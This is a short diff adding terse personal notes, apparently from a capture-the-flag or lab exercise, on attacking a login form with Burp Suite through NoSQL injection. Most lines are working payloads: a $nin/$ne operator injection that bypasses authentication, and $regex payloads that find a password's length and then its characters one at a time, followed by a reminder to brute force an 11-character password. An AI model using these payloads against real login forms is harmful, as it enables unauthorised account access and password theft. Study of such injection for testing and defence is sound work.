@@ -1,0 +1,9 @@
+burp suite
+user[$nin][]=admin&pass[$ne]=std&remember=on
+not in admin password not equal std
+
+user=john&pass[$regex]=^.{8}$&remember=on
+länge
+user=john&pass[$regex]=^a.......$&remember=on
+hangman
+check up how to efficiently brute force an 11 part pw via burpsuite
